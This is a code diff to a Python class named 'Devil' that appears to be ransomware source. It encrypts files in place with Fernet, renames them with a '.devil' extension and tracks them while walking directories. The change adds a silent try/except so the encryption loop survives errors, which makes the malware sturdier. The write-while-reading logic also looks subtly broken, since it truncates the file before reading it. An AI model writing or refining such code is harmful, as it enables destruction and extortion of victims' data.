@@ -45,13 +45,16 @@ class Devil:
         if not file in self.encrypted:
             if os.stat(path=file).st_size >= self.min_len:
                 if os.stat(path=file).st_size <= self.max_len:
-                    with open(file, "rb") as File:
-                        with open(file, "wb") as Encd:
-                            Encd.write(self.fernet.encrypt(data=File.read()))
-                        Encd.close()
-                    File.close()
-                    os.rename(src=file, dst=''.join(os.path.splitext(file)[:-1]) + ".devil")
-                    self.encrypted.append(file)
+                    try:
+                        with open(file, "rb") as File:
+                            with open(file, "wb") as Encd:
+                                Encd.write(self.fernet.encrypt(data=File.read()))
+                            Encd.close()
+                        File.close()
+                        os.rename(src=file, dst=''.join(os.path.splitext(file)[:-1]) + ".devil")
+                        self.encrypted.append(file)
+                    except Exception:
+                        pass
 
     def Map(self):
         def loop(directories):
